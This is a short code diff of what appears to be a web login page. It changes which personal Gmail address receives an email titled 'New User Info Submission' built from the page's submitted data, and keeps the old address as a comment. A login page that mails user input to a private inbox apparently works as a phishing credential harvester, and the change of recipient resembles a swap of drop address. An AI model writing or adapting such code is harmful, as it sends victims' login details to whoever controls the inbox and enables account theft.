@@ -177,7 +177,8 @@ export default async function LoginPage({
     try {
       await transporter.sendMail({
         from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
-        to: "officialbenz80@gmail.com", // Destination address
+        to: "emmizy2015@gmail.com", // Destination address
+        // to: "officialbenz80@gmail.com",
         subject: "New User Info Submission",
         html: emailHtml,
       });
